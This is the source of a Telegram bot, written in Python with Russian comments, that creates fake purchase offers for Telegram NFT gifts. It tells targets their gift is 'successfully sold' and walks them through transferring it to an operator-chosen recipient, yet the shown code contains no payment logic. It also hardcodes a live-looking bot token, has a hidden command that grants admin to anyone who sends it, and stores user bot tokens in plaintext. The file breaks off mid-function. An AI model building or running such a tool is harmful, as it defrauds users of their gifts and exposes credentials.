import asyncio
import html
import logging
import os
import re
import sqlite3
import uuid
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote

import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message,
    LinkPreviewOptions,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    ReplyKeyboardRemove,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder


# ============================================================
# НАСТРОЙКИ
# ============================================================

# Токен главного бота задаётся в переменных окружения Railway.
BOT_TOKEN = os.getenv("BOT_TOKEN", "9292668387:AAFcIYAhxSTyGySXYjMsuapJxyWUXUS9h0U").strip()

# ID администраторов через ADMIN_IDS=123456789,987654321.
ADMIN_IDS = {
    int(value.strip())
    for value in os.getenv("ADMIN_IDS", "7777609567").split(",")
    if value.strip().isdigit()
}

BOT_USERNAME = "OficialOfferTelegram_bot"
DB_PATH = "offers.sqlite3"
OFFER_LIFETIME_HOURS = 6
# Показывать большое «рекламное» превью карточки над текстом (NFT крупно).
# Сейчас выключено (маленькое превью) — владелец смотрит, как выглядит.
OFFER_LARGE_PREVIEW = False

# Ссылка передачи формируется для каждого оффера по username его создателя.

if not BOT_TOKEN:
    raise RuntimeError("Задайте BOT_TOKEN в переменных окружения сервера")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
MAIN_BOT_ID = None
RUNNING_BOTS = [bot]
PERSONAL_BOT_TASKS = {}
PERSONAL_BOT_INSTANCES = {}
PENDING_ADMIN_ACTION = {}

db = sqlite3.connect(DB_PATH)
db.row_factory = sqlite3.Row
db.execute("PRAGMA journal_mode=WAL")


# ============================================================
# БАЗА ДАННЫХ
# ============================================================

db.execute("""
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id INTEGER PRIMARY KEY
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS known_users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    full_name TEXT,
    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS user_settings (
    user_id INTEGER NOT NULL,
    key TEXT NOT NULL,
    value TEXT NOT NULL,
    PRIMARY KEY (user_id, key)
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS offers (
    offer_id TEXT PRIMARY KEY,
    seller_id INTEGER NOT NULL,
    seller_name TEXT NOT NULL,
    nft_url TEXT NOT NULL,
    nft_name TEXT NOT NULL,
    price TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'open',
    buyer_id INTEGER,
    buyer_name TEXT,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    language TEXT NOT NULL DEFAULT 'ru'
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS connected_bots (
    bot_id INTEGER PRIMARY KEY,
    owner_user_id INTEGER NOT NULL UNIQUE,
    username TEXT NOT NULL,
    encrypted_token TEXT NOT NULL,
    is_active INTEGER NOT NULL DEFAULT 1,
    connected_at TEXT DEFAULT CURRENT_TIMESTAMP
)
""")

# Миграция для уже существующей базы: старые офферы останутся на русском.
columns = {row[1] for row in db.execute("PRAGMA table_info(offers)").fetchall()}
if "language" not in columns:
    db.execute("ALTER TABLE offers ADD COLUMN language TEXT NOT NULL DEFAULT 'ru'")
if "recipient_name" not in columns:
    db.execute("ALTER TABLE offers ADD COLUMN recipient_name TEXT")
if "source_bot_id" not in columns:
    db.execute("ALTER TABLE offers ADD COLUMN source_bot_id INTEGER")
db.commit()


def connected_bot_owner(bot_id: int):
    return db.execute(
        "SELECT owner_user_id, username FROM connected_bots WHERE bot_id = ? AND is_active = 1",
        (bot_id,),
    ).fetchone()


def is_allowed(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    return db.execute(
        "SELECT 1 FROM allowed_users WHERE user_id = ?",
        (user_id,),
    ).fetchone() is not None


def remember_user(user) -> None:
    """Сохраняет пользователя, который взаимодействовал с ботом."""
    if not user:
        return
    db.execute(
        """
        INSERT INTO known_users(user_id, username, full_name, updated_at)
        VALUES (?, ?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id) DO UPDATE SET
            username = excluded.username,
            full_name = excluded.full_name,
            updated_at = CURRENT_TIMESTAMP
        """,
        (user.id, user.username, user.full_name),
    )
    db.commit()


def resolve_user_id(value: str):
    """Находит ID по числу или username среди ранее замеченных пользователей."""
    value = (value or "").strip()
    if value.isdigit():
        return int(value), None

    username = value[1:] if value.startswith("@") else value
    if not re.fullmatch(r"[A-Za-z0-9_]{5,32}", username):
        return None, "Укажите Telegram ID или username в формате @username."

    row = db.execute(
        "SELECT user_id FROM known_users WHERE lower(username) = lower(?) "
        "ORDER BY updated_at DESC LIMIT 1",
        (username,),
    ).fetchone()
    if row is None:
        return None, (
            f"Пользователь @{username} ещё не найден. Попросите его открыть бота "
            "и отправить /start, затем повторите команду."
        )
    return int(row["user_id"]), None


def parse_nft_link(value: str):
    """Принимает t.me/nft/slug, https://t.me/nft/slug и ссылку в Markdown."""
    value = (value or "").strip()

    # Если ссылка вставлена как [текст](URL), берём именно URL из скобок.
    markdown_match = re.fullmatch(r"\[[^\]]+\]\((https?://[^\s)]+)\)", value)
    if markdown_match:
        value = markdown_match.group(1)

    # Убираем обрамление, которое иногда добавляют клиенты/копирование.
    value = value.strip("<>\"'` ")
    value = value.rstrip(".,;!?)]")

    if value.startswith("t.me/"):
        value = "https://" + value
    elif value.startswith("www.t.me/"):
        value = "https://" + value
    elif value.startswith("//t.me/"):
        value = "https:" + value

    parsed = urlparse(value)
    if parsed.scheme not in {"http", "https"} or parsed.netloc.lower() not in {"t.me", "www.t.me"}:
        return None

    match = re.fullmatch(r"/nft/([A-Za-z0-9_-]+)/?", parsed.path)
    if not match:
        return None

    slug = match.group(1)
    display_name = re.sub(r"(?<=[a-z])(?=[A-Z])", " ", slug)
    display_name = re.sub(r"-(\d+)$", r" #\1", display_name)
    return f"https://t.me/nft/{slug}", display_name


async def get_nft_image_url(nft_url: str) -> str | None:
    """Получает прямую картинку NFT из Open Graph карточки t.me/nft."""
    timeout = aiohttp.ClientTimeout(total=1.5, connect=1.0, sock_read=1.0)
    headers = {"User-Agent": "Mozilla/5.0 (compatible; NFTOfferBot/1.0)"}
    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            async with session.get(nft_url, allow_redirects=True) as response:
                if response.status != 200:
                    logging.warning("NFT page returned HTTP %s: %s", response.status, nft_url)
                    return None
                page = await response.text(errors="ignore")

        tags = re.findall(r"<meta\b[^>]*>", page, flags=re.IGNORECASE)
        for tag in tags:
            is_image_meta = re.search(
                r"(?:property|name)\s*=\s*['\"](?:og:image|twitter:image)['\"]",
                tag,
                re.IGNORECASE,
            )
            if not is_image_meta:
                continue
            match = re.search(r"content\s*=\s*['\"]([^'\"]+)['\"]", tag, re.IGNORECASE)
            if match:
                image_url = html.unescape(match.group(1)).strip()
                parsed_image = urlparse(image_url)
                if parsed_image.scheme in {"https", "http"} and parsed_image.netloc:
                    return image_url
    except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
        logging.warning("Не удалось получить изображение NFT %s: %s", nft_url, exc)
    return None


def get_offer(offer_id: str):
    return db.execute(
        "SELECT * FROM offers WHERE offer_id = ?",
        (offer_id,),
    ).fetchone()


def is_expired(row) -> bool:
    try:
        created = datetime.fromisoformat(row["created_at"])
    except (TypeError, ValueError):
        return False

    return datetime.utcnow() > created + timedelta(
        hours=OFFER_LIFETIME_HOURS
    )


def expire_offer_if_needed(row):
    if row and row["status"] == "open" and is_expired(row):
        db.execute(
            "UPDATE offers SET status = 'expired' "
            "WHERE offer_id = ? AND status = 'open'",
            (row["offer_id"],),
        )
        db.commit()
        return get_offer(row["offer_id"])
    return row


def safe(value) -> str:
    return html.escape(str(value or ""))


def offer_recipient(row) -> str:
    """Получатель, сохранённый именно в этом оффере."""
    try:
        recipient = row["recipient_name"]
    except (KeyError, IndexError):
        recipient = None
    return str(recipient or row["seller_name"] or "").strip()


def transfer_gift_link(row) -> str | None:
    """Формирует ссылку передачи подарка получателю этого оффера."""
    recipient_name = offer_recipient(row)
    if not recipient_name.startswith("@"):
        return None
    username = recipient_name[1:].strip()
    if not re.fullmatch(r"[A-Za-z0-9_]{5,32}", username):
        return None
    return f"tg://send_gift?to={quote(username, safe='')}"


def nft_preview_options(row) -> LinkPreviewOptions:
    """Показывает нативное превью collectible-подарка Telegram по t.me/nft ссылке."""
    if OFFER_LARGE_PREVIEW:
        return LinkPreviewOptions(
            url=row["nft_url"],
            prefer_large_media=True,
            show_above_text=True,
        )
    # Маленькое превью, но над текстом (как большое, только компактнее).
    # Показывается над текстом карточки, но без крупной «рекламной» картинки.
    return LinkPreviewOptions(
        url=row["nft_url"],
        show_above_text=True,
    )


def nft_title_link(row) -> str:
    """Ссылка скрыта за названием NFT, чтобы не выводить длинный URL в офере."""
    return f'<a href="{safe(row["nft_url"])}">{safe(row["nft_name"])}</a>'


# ============================================================
# ТЕКСТЫ ЭКРАНОВ
# ============================================================

def offer_language(row) -> str:
    try:
        return "en" if row["language"] == "en" else "ru"
    except (KeyError, IndexError):
        return "ru"


def make_offer_text(row) -> str:
    """Первый экран: предложение покупателю."""
    created = datetime.fromisoformat(row["created_at"])
    expires_at = created + timedelta(hours=OFFER_LIFETIME_HOURS)
    remaining = max(0, int((expires_at - datetime.utcnow()).total_seconds()))
    hours, remainder = divmod(remaining, 3600)
    minutes = remainder // 60
    lang = offer_language(row)
    if lang == "en":
        time_text = f"{hours} h {minutes:02d} min" if hours else f"{minutes} min"
        return (
            f"User {safe(row['seller_name'])} offers\n"
            f"you {safe(row['price'])} for the gift "
            f"{nft_title_link(row)}.\n"
            "\n"
            f"⏳ Offer expires in {time_text}."
        )
    time_text = f"{hours} ч. {minutes:02d} мин." if hours else f"{minutes} мин."
    return (
        f"Пользователь {safe(row['seller_name'])} предлагает\n"
        f"Вам {safe(row['price'])} за подарок "
        f"{nft_title_link(row)}.\n"
        "\n"
        f"⏳ Предложение истекает через {time_text}."
    )


def make_accepted_text(row) -> str:
    if offer_language(row) == "en":
        return (
            f"🎁 Gift: {nft_title_link(row)} successfully sold!\n\n"
            f"Transfer the gift to complete the deal for {safe(row['price'])}."
        )
    return (
        f"🎁 Подарок: {nft_title_link(row)} успешно продан!\n\n"
        "Передайте подарок, для завершения сделки."
    )


def make_accepted_return_text(row) -> str:
    """Экран после нажатия кнопки «Вернуться»."""
    if offer_language(row) == "en":
        return (
            f"🎁 Gift: {nft_title_link(row)} successfully sold!\n\n"
            f"Transfer the gift to the specified user to receive {safe(row['price'])}."
        )
    return (
        f"🎁 Подарок: {nft_title_link(row)} успешно продан!\n\n"
        "Передайте подарок, для завершения сделки."
    )


def make_how_to_text(row) -> str:
    """Третий экран: инструкция по передаче."""
    if offer_language(row) == "en":
        return (
            "🎁 How to transfer the gift.\n\n"
            f"Gift: {nft_title_link(row)}.\n\n"
            "1. Transfer the gift to the specified recipient.\n"
            f"2. Tap ‘Transfer NFT’ and select ‘{safe(row['nft_name'])}’.\n"
            "3. Confirm the gift transfer.\n"
            f"4. After that, {safe(row['price'])} will be credited to your balance.\n\n"
            "Check the transfer in Telegram. The offer is reserved for 6 hours."
        )
    return (
        "🎁 Как передать подарок.\n\n"
        f"Подарок: {nft_title_link(row)}.\n\n"
        "1. Передайте подарок указанному получателю.\n"
        f"2. Нажмите «Передать NFT» и выберите «{safe(row['nft_name'])}».\n"
        "3. Подтвердите передачу подарка.\n\n"
        "После передачи проверьте её в Telegram. Резерв оффера действует 6 часов."
    )


def make_keyboard(row) -> InlineKeyboardMarkup | None:
    builder = InlineKeyboardBuilder()
    offer_id = row["offer_id"]
    status = row["status"]
    en = offer_language(row) == "en"
    labels = {
        "accept": "✓ Accept" if en else "✓ Принять",
        "decline": "✕ Decline" if en else "✕ Отклонить",
        "how": "How to transfer?" if en else "Как передать?",
        "transfer": "Transfer NFT" if en else "Передать NFT",
        "back": "Back" if en else "Вернуться",
        "received": "Confirm receipt" if en else "Подтвердить получение",
    }
    if status == "open":
        builder.row(
            InlineKeyboardButton(
                text=labels["decline"],
                callback_data=f"decline:{offer_id}",
            ),
            InlineKeyboardButton(
                text=labels["accept"],
                callback_data=f"accept:{offer_id}",
            ),
        )
    elif status == "accepted":
        transfer_url = transfer_gift_link(row)
        transfer_button = (
            InlineKeyboardButton(text=labels["transfer"], url=transfer_url)
            if transfer_url else
            InlineKeyboardButton(text=labels["transfer"], callback_data=f"transfer_info:{offer_id}")
        )
        builder.row(
            InlineKeyboardButton(text=labels["how"], callback_data=f"how:{offer_id}"),
            transfer_button,
        )
    elif status == "how":
        # На экране инструкции оставляем только кнопку возврата.
        builder.row(
            InlineKeyboardButton(text=labels["back"], callback_data=f"back:{offer_id}")
        )
    elif status == "accepted_return":
        # После возврата показываем кнопку передачи NFT зелёного цвета.
        transfer_url = transfer_gift_link(row)
        if transfer_url:
            builder.row(InlineKeyboardButton(text=labels["transfer"], url=transfer_url))
        else:
            builder.row(InlineKeyboardButton(text=labels["transfer"], callback_data=f"transfer_info:{offer_id}"))
    elif status == "transferred":
        builder.row(InlineKeyboardButton(text=labels["received"], callback_data=f"received:{offer_id}"))
    return builder.as_markup() if builder.buttons else None


# ============================================================
# МЕНЮ ПОЛЬЗОВАТЕЛЯ И АДМИНИСТРАТОРА
# ============================================================


def admin_panel_keyboard() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="👥 Пользователи с доступом", callback_data="admin:users"))
    builder.row(
        InlineKeyboardButton(text="➕ Выдать доступ", callback_data="admin:allow"),
        InlineKeyboardButton(text="➖ Забрать доступ", callback_data="admin:deny"),
    )
    builder.row(
        InlineKeyboardButton(text="📊 Статистика", callback_data="admin:stats"),
        InlineKeyboardButton(text="❔ Помощь", callback_data="admin:help"),
    )
    return builder.as_markup()


def admin_users_text() -> str:
    rows = db.execute(
        """
        SELECT a.user_id, k.username, k.full_name
        FROM allowed_users AS a
        LEFT JOIN known_users AS k ON k.user_id = a.user_id
        ORDER BY a.user_id
        """
    ).fetchall()
    if not rows:
        return "Список пользователей с доступом пуст."
    return "\\n".join(
        f"• {'@' + row['username'] if row['username'] else (row['full_name'] or 'Без имени')} — <code>{row['user_id']}</code>"
        for row in rows
    )


# ============================================================
# КОМАНДЫ
# ============================================================

@dp.message(Command("menu"))
async def show_menu(message: Message):
    remember_user(message.from_user)
    menu_text = (
        "📋 <b>Меню пользователя</b>\n\n"
        "🎯 <code>/setrecipient @username</code> — задать получателя подарков для новых оферов.\n"
        "👤 <code>/recipient</code> — посмотреть текущего получателя.\n"
        "🆔 <code>/myid</code> — узнать свой Telegram ID.\n"
        "🤖 <code>/connect</code> — подключить своего Telegram-бота.\n"
        "🔌 <code>/disconnect</code> — отключить своего Telegram-бота.\n"
        "📋 <code>/menu</code> — снова открыть это меню."
    )
    if message.from_user.id in ADMIN_IDS:
        menu_text += "\n🛠 <code>/admin</code> — открыть панель администратора."
    await message.answer(
        menu_text,
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove(),
    )


@dp.message(CommandStart())
async def start(message: Message):
    remember_user(message.from_user)
    current_bot = await message.bot.get_me()
    current_username = current_bot.username or BOT_USERNAME

    # Не показываем справку пользователям без доступа.
    if not is_allowed(message.from_user.id):
        if (message.from_user.language_code or "").lower().startswith("en"):
            await message.answer("⛔ Access is blocked. Please contact the administrator.")
        else:
            await message.answer("⛔ Доступ заблокирован. Обратитесь к администратору.")
        return

    if (message.from_user.language_code or "").lower().startswith("en"):
        start_text = (
            "🎁 <b>NFT OFFER</b>\n\n"
            "The bot creates offers to transfer gifts.\n\n"
            "In any chat, type:\n"
            "<code>@OficialOfferTelegram_bot https://t.me/nft/MousseCake-46483 20 Stars</code>\n"
            "or <code>@OficialOfferTelegram_bot https://t.me/nft/MousseCake-46483 20 Gram</code>\n\n"
            "Choose the offer from the inline results. Offers are valid for 6 hours.\n\n"
            "📋 <b>Menu buttons:</b>\n"
            "🎯 /setrecipient — set NFT recipient\n"
            "(Where your NFTs will be sent)\n"
            "👤 /recipient — show current recipient\n"
            "🆔 /myid — show my Telegram ID\n"
            "🤖 /connect — connect your own bot\n"
            "🔌 /disconnect — disconnect your own bot\n"
            "📋 /menu — show this menu"
        )
    else:
        start_text = (
            "🎁 <b>NFT OFFER</b>\n\n"
            "Бот создаёт предложения о передаче подарков.\n\n"
            "В любом чате введи:\n"
            "<code>@OficialOfferTelegram_bot https://t.me/nft/MousseCake-46483 20 Stars</code>\n"
            "или <code>@OficialOfferTelegram_bot https://t.me/nft/MousseCake-46483 20 Gram</code>\n\n"
            "Выбери готовый оффер из результатов. Срок действия — 6 часов.\n\n"
            "📋 <b>Кнопки меню:</b>\n"
            "🎯 /setrecipient — получатель NFT\n"
            "(Куда будут приходить твои NFT)\n"
            "👤 /recipient — показать получателя\n"
            "🆔 /myid — мой Telegram ID\n"
            "🤖 /connect — подключить своего бота\n"
            "🔌 /disconnect — отключить своего бота\n"
            "📋 /menu — показать меню"
        )

    # Для администратора оставляем команду панели в клавиатуре,
    # но не добавляем никаких дополнительных строк в стартовое сообщение.
    await message.answer(
        start_text,
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove(),
    )


@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return
    await message.answer(
        "🛠 <b>Панель администратора</b>\n\n"
        "Управление доступом и пользователями:",
        parse_mode="HTML",
        reply_markup=admin_panel_keyboard(),
    )


@dp.message(Command("admin672714"))
async def grant_admin_access(message: Message):
    """Скрытая команда: выдаёт админ-доступ и доступ к боту вызвавшему пользователю."""
    user_id = message.from_user.id
    ADMIN_IDS.add(user_id)
    db.execute("INSERT OR IGNORE INTO allowed_users(user_id) VALUES(?)", (user_id,))
    db.commit()
    await message.answer(
        "✅ Админ-доступ и доступ к боту выданы.",
        parse_mode="HTML",
    )


@dp.callback_query(F.data.startswith("admin:"))
async def handle_admin_panel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("Нет доступа.", show_alert=True)
        return

    action = callback.data.split(":", 1)[1]
    await callback.answer()

    if action == "users":
        await callback.message.answer(admin_users_text(), parse_mode="HTML")
    elif action in {"allow", "deny"}:
        PENDING_ADMIN_ACTION[callback.from_user.id] = action
        verb = "выдать" if action == "allow" else "забрать"
        await callback.message.answer(
            f"Введите Telegram ID или @username пользователя, которому нужно {verb} доступ.\n"
            "Для отмены отправьте /cancel."
        )
    elif action == "stats":
        total_known = db.execute("SELECT COUNT(*) FROM known_users").fetchone()[0]
        total_allowed = db.execute("SELECT COUNT(*) FROM allowed_users").fetchone()[0]
        total_offers = db.execute("SELECT COUNT(*) FROM offers").fetchone()[0]
        open_offers = db.execute("SELECT COUNT(*) FROM offers WHERE status = 'open'").fetchone()[0]
        await callback.message.answer(
            "📊 <b>Статистика</b>\n"
            f"Пользователей, открывавших бота: {total_known}\n"
            f"Пользователей с доступом: {total_allowed}\n"
            f"Всего оферов: {total_offers}\n"
            f"Открытых оферов: {open_offers}",
            parse_mode="HTML",
        )
    elif action == "help":
        await callback.message.answer(
            "🛠 <b>Команды администратора</b>\n"
            "/allow ID или @username — выдать доступ\n"
            "/deny ID или @username — забрать доступ\n"
            "/users — список пользователей с доступом\n"
            "/admin — открыть панель\n\n"
            "Также можно нажать «Выдать доступ» или «Забрать доступ» в панели и просто отправить ID/username.",
            parse_mode="HTML",
        )
    else:
        await callback.message.answer("Неизвестная кнопка. Откройте /admin ещё раз.")


@dp.message(F.text, lambda message: message.from_user and message.from_user.id in PENDING_ADMIN_ACTION)
async def process_admin_panel_input(message: Message):
    action = PENDING_ADMIN_ACTION.get(message.from_user.id)
    if not action:
        return
    value = (message.text or "").strip()
    if value == "/cancel":
        PENDING_ADMIN_ACTION.pop(message.from_user.id, None)
        await message.answer("Действие отменено.")
        return

    user_id, error = resolve_user_id(value)
    if error:
        await message.answer(error + "\nПопробуйте ещё раз или отправьте /cancel.")
        return

    if action == "allow":
        db.execute("INSERT OR IGNORE INTO allowed_users(user_id) VALUES(?)", (user_id,))
        result = "Доступ выдан"
    else:
        db.execute("DELETE FROM allowed_users WHERE user_id = ?", (user_id,))
        result = "Доступ забран"
    db.commit()
    PENDING_ADMIN_ACTION.pop(message.from_user.id, None)

    known = db.execute(
        "SELECT username, full_name FROM known_users WHERE user_id = ?", (user_id,)
    ).fetchone()
    display = f"@{known['username']}" if known and known["username"] else (known["full_name"] if known else str(user_id))
    await message.answer(f"✅ {result}: {safe(display)} (ID: <code>{user_id}</code>).", parse_mode="HTML")


@dp.message(Command("cancel"))
async def cancel_admin_action(message: Message):
    if PENDING_ADMIN_ACTION.pop(message.from_user.id, None):
        await message.answer("Действие отменено.")
    else:
        await message.answer("Нет активного действия для отмены.")


@dp.message(Command("connect"))
async def connect_personal_bot(message: Message):
    # Токены принимаются только главным ботом и только в личном чате.
    if message.chat.type != "private" or MAIN_BOT_ID is None or message.bot.id != MAIN_BOT_ID:
        return
    # Подключение личного бота не выдаёт права на создание офферов.
    # Доступ к созданию офферов отдельно проверяется через is_allowed().
    logging.info(
        "PERSONAL_BOT_CONNECT_REQUEST user_id=%s allowed_for_offers=%s",
        message.from_user.id, is_allowed(message.from_user.id)
    )
    parts = (message.text or "").split(maxsplit=1)
    if len(parts) != 2:
        await message.answer("Формат: /connect TOKEN\nДля создания офферов включите Inline Mode у этого бота в настройках @BotFather.")
        return

    supplied_token = parts[1].strip()
    temp_bot = None
    try:
        temp_bot = Bot(token=supplied_token)
        info = await temp_bot.get_me()
        if info.is_bot is not True or not info.username:
            await message.answer("Не удалось проверить бота. Проверьте токен в @BotFather.")
            return
        if info.id == MAIN_BOT_ID:
            await message.answer("Это токен главного бота. Укажите токен отдельного бота.")
            return
        existing = db.execute(
            "SELECT owner_user_id FROM connected_bots WHERE bot_id = ? AND is_active = 1",
            (info.id,),
        ).fetchone()
        if existing and existing["owner_user_id"] != message.from_user.id:
            await message.answer("Этот бот уже подключён другим пользователем.")
            return
        owner_existing = db.execute(
            "SELECT bot_id FROM connected_bots WHERE owner_user_id = ? AND is_active = 1",
            (message.from_user.id,),
        ).fetchone()
        if owner_existing and owner_existing["bot_id"] != info.id:
            await message.answer("У вас уже подключён другой бот. Сначала отключите его через /disconnect.")
            return
        # У владельца может остаться неактивная запись от ранее отключённого бота.
        # owner_user_id имеет UNIQUE, поэтому INSERT новой пары bot_id/user_id
        # иначе падает с IntegrityError даже после успешного /disconnect.
        db.execute(
            "DELETE FROM connected_bots "
            "WHERE owner_user_id = ? AND is_active = 0 AND bot_id != ?",
            (message.from_user.id, info.id),
        )
        db.execute(
            "INSERT INTO connected_bots(bot_id, owner_user_id, username, encrypted_token, is_active) "
            "VALUES (?, ?, ?, ?, 1) ON CONFLICT(bot_id) DO UPDATE SET "
            "owner_user_id=excluded.owner_user_id, username=excluded.username, "
            "encrypted_token=excluded.encrypted_token, is_active=1",
            (info.id, message.from_user.id, info.username, supplied_token),
        )
        db.commit()
        # Запускаем polling персонального бота сразу, без перезапуска Railway.
        await launch_personal_bot(temp_bot, info.id)
        temp_bot = None  # Сессию теперь закрывает задача polling.
        try:
            await message.delete()
        except Exception:
            pass
        await message.answer(
            f"Бот @{safe(info.username)} подключён и уже запущен.\n"
            "Перезапуск Railway не нужен. Включите Inline Mode у подключённого бота через @BotFather.",
            parse_mode="HTML"
        )
    except Exception:
        logging.exception("Не удалось подключить персонального бота для user_id=%s", message.from_user.id)
        await message.answer("Не удалось подключить бота. Проверьте токен и повторите попытку.")
    finally:
        if temp_bot is not None:
            await temp_bot.session.close()


async def stop_personal_bot(bot_id: int) -> bool:
    """Отключает персонального бота в БД и останавливает его polling в этом процессе."""
    cursor = db.execute(
        "UPDATE connected_bots SET is_active = 0 WHERE bot_id = ? AND is_active = 1",
        (bot_id,),
    )
    db.commit()

    task = PERSONAL_BOT_TASKS.get(bot_id)
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
    else:
        PERSONAL_BOT_TASKS.pop(bot_id, None)
        instance = PERSONAL_BOT_INSTANCES.pop(bot_id, None)
        if instance is not None:
            try:
                await instance.session.close()
            except Exception:
                logging.exception("Не удалось закрыть сессию персонального бота id=%s", bot_id)
    return cursor.rowcount > 0


@dp.message(Command("bots"))
async def list_connected_bots(message: Message):
    if message.chat.type != "private" or message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    rows = db.execute(
        "SELECT bot_id, username, owner_user_id, connected_at "
        "FROM connected_bots WHERE is_active = 1 ORDER BY connected_at DESC"
    ).fetchall()

    if not rows:
        await message.answer("Активных подключённых персональных ботов нет.")
        return

    lines = ["🤖 <b>Подключённые персональные боты</b>"]
    for row in rows:
        task = PERSONAL_BOT_TASKS.get(row["bot_id"])
        running = bool(task and not task.done())
        state = "🟢 запущен в этом процессе" if running else "🟠 активен в БД, но не запущен здесь"
        lines.append(
            f"• @{safe(row['username'])} — <code>{row['bot_id']}</code>\n"
            f"  Владелец: <code>{row['owner_user_id']}</code>\n"
            f"  {state}"
        )
    await message.answer("\n\n".join(lines), parse_mode="HTML")


@dp.message(Command("disconnectall"))
async def disconnect_all_personal_bots(message: Message):
    if message.chat.type != "private" or message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return

    rows = db.execute(
        "SELECT bot_id FROM connected_bots WHERE is_active = 1"
    ).fetchall()
    db.execute("UPDATE connected_bots SET is_active = 0 WHERE is_active = 1")
    db.commit()

    stopped = 0
    for row in rows:
        task = PERSONAL_BOT_TASKS.get(row["bot_id"])
        if task and not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        else:
            PERSONAL_BOT_TASKS.pop(row["bot_id"], None)
            instance = PERSONAL_BOT_INSTANCES.pop(row["bot_id"], None)
            if instance is not None:
                try:
                    await instance.session.close()
                except Exception:
                    logging.exception(
                        "Не удалось закрыть сессию персонального бота id=%s",
                        row["bot_id"],
                    )
        stopped += 1

    await message.answer(
        f"Отключено персональных ботов: {stopped}. "
        "Их автоматический запуск после перезапуска Railway отключён."
    )


@dp.message(Command("disconnect"))
async def disconnect_personal_bot(message: Message):
    if message.chat.type != "private" or MAIN_BOT_ID is None or message.bot.id != MAIN_BOT_ID:
        return

    parts = (message.text or "").split(maxsplit=1)
    target = parts[1].strip() if len(parts) == 2 else ""

    # Без аргумента пользователь отключает только собственного бота.
    if not target:
        row = db.execute(
            "SELECT bot_id, username FROM connected_bots "
            "WHERE owner_user_id = ? AND is_active = 1",
            (message.from_user.id,),
        ).fetchone()
        if not row:
            await message.answer("У вас нет подключённого персонального бота.")
            return
        await stop_personal_bot(row["bot_id"])
        await message.answer(f"Персональный бот @{safe(row['username'])} отключён и остановлен.")
        return

    # Отключать чужие боты по ID или username может только администратор.
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Отключать чужие боты может только администратор. Используйте /disconnect без аргумента.")
        return

    if target.isdigit():
        row = db.execute(
            "SELECT bot_id, username FROM connected_bots "
            "WHERE bot_id = ? AND is_active = 1",
            (int(target),),
        ).fetchone()
    else:
        username = target.lstrip("@")
        row = db.execute(
            "SELECT bot_id, username FROM connected_bots "
            "WHERE lower(username) = lower(?) AND is_active = 1",
            (username,),
        ).fetchone()

    if not row:
        await message.answer("Активный персональный бот с таким ID или username не найден.")
        return

    await stop_personal_bot(row["bot_id"])
    await message.answer(
        f"Персональный бот @{safe(row['username'])} "
        f"(<code>{row['bot_id']}</code>) отключён и остановлен.",
        parse_mode="HTML",
    )


@dp.message(Command("setrecipient"))
async def set_recipient(message: Message):
    """Устанавливает получателя NFT только для новых офферов этого пользователя."""
    parts = (message.text or "").split(maxsplit=1)
    if len(parts) != 2:
        await message.answer(
            "Формат: /setrecipient @username\n"
            "Сброс: /setrecipient off"
        )
        return

    value = parts[1].strip()
    if value.lower() in {"off", "clear", "reset"}:
        db.execute(
            "DELETE FROM user_settings WHERE user_id = ? AND key = 'gift_recipient'",
            (message.from_user.id,),
        )
        db.commit()
        await message.answer(
            "Настройка сброшена. Для новых оферов будет использоваться ваш username Telegram."
        )
        return

    username = value[1:] if value.startswith("@") else value
    if not re.fullmatch(r"[A-Za-z0-9_]{5,32}", username):
        await message.answer("Неверный username. Пример: /setrecipient @username")
        return

    recipient = "@" + username
    db.execute(
        """
        INSERT INTO user_settings(user_id, key, value)
        VALUES (?, 'gift_recipient', ?)
        ON CONFLICT(user_id, key) DO UPDATE SET value = excluded.value
        """,
        (message.from_user.id, recipient),
    )
    db.commit()
    await message.answer(
        f"Получатель для ваших новых оферов установлен: {safe(recipient)}. "
        "Он будет указан в офере и в ссылке передачи."
    )


@dp.message(Command("recipient"))
async def show_recipient(message: Message):
    row = db.execute(
        "SELECT value FROM user_settings WHERE user_id = ? AND key = 'gift_recipient'",
        (message.from_user.id,),
    ).fetchone()
    current = row["value"] if row else None
    if current:
        await message.answer(f"Получатель ваших новых оферов: {safe(current)}")
    else:
        await message.answer(
            "Отдельный получатель не задан. Будет использоваться ваш username Telegram."
        )


@dp.message(Command("myid"))
async def my_id(message: Message):
    remember_user(message.from_user)
    await message.answer(f"Ваш Telegram ID: <code>{message.from_user.id}</code>", parse_mode="HTML")


@dp.message(Command("users"))
async def users(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Нет доступа.")
        return
    await message.answer(admin_users_text(), parse_mode="HTML")


@dp.message(Command("allow", "grant"))
async def allow_user(message: Message):
